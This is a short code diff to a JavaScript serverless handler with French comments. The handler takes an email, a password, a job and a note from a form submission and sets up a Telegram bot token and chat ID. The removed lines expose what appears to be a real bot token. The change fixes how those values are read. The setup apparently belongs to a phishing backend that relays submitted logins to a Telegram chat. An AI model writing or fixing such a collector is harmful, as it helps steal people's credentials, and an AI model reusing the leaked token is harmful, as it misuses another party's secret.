@@ -15,10 +15,9 @@ export default async function handler(req, res) {
     try {
       const { job, email, password, note } = req.body;
 
-      // Vos variables d'environnement
-      const BOT_TOKEN = process.env.7645874601:AAHS6vORgaXb_pOZg7WvpZ1jbr1WrADzmMw;
-      const CHAT_ID = process.env.6075203216;
-
+     const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;        
+      
       // Vérifier que les variables sont définies
       if (!BOT_TOKEN || !CHAT_ID) {
         console.error('Variables manquantes:', { 
